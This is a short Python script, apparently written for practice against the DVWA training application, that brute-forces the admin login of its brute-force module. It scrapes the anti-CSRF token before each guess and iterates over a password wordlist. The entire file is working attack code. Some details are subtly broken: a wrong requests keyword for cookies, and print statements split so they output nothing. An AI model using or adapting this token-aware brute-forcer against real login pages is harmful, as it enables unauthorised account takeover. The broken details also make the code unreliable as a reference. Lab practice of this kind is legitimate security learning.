#!/usr/bin/python3
# -*- coding: UTF-8 -*-
import requests
from bs4 import BeautifulSoup

payloads = open('passdirt.txt', 'r')

url = "http://localhost/DVWA/vulnerabilities/brute/index.php?username=admin&password={0}&Login=Login&user_token={1}#"

Cookie = {
    'security':'high',
    'PHPSESSID':'rib4i62cfc85c80722a5gisk67'
}

headers = {
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36'
}

def attack(payloads, url):
    #先获得user_token
    source = 'http://localhost/DVWA/vulnerabilities/brute/index.php#'
    index = 0
    #请求必须带上Cookie，因为dvwa需要登录
    web_data = requests.get(source, headers = headers, Cookie = Cookie)
    soup = BeautifulSoup(web_data.text, 'lxml')
    user_token = soup.select('input[name="user_token"]')[0]['value']
    #遍历字典，进行枚举
    for payload1 in payloads:
        target = url.format(payload1, user_token)
        print(u'当前请求：'+target)
        web_data = requests.get(target, headers=headers, Cookie=Cookie)
        soup = BeautifulSoup(web_data.text, 'lxml');
        user_token = soup.select('input[name="user_token"]')[0]['value'];
        feature = soup.find('pre')
        #异常处理，错误的密码或者用户名就会页面会出现此语句
        try:
            if feature.get_text() == 'Username and/or password incorrect.':
                print
                u'错误'
        except:
            print
            u'可能得到结果：'
            print
            'ssword:' + payload1
            exit(u'结束')

#attack(payloads,url)

#封装
if __name__ == '__main__':
    attack(payloads,url)